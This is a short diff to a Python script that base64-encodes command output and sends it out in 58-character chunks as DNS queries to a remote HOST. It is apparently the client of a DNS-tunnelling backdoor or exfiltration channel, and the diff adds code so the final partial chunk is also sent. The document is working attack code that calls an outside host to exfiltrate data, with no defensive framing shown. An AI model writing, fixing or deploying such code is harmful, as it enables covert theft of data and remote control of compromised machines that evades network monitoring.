@@ -41,12 +41,18 @@ while 1:
   #encode output data, ready for loop
   output = base64.b64encode(stdoutput)
   send =''
+  output_end = len(output)
   for chunk in output:
     send += chunk
+    output_end -= 1
     #Send every 58 charcters
     if len(send) == 58:
       feedback_request = dns.message.make_query(send+'.com', dns.rdatatype.A)
       dns.query.udp(feedback_request, HOST)
       send =''
+    #Send out final chunk
+    if output_end == 0:
+      feedback_request = dns.message.make_query(send+'.com', dns.rdatatype.A)
+      dns.query.udp(feedback_request, HOST)
 
 exit()
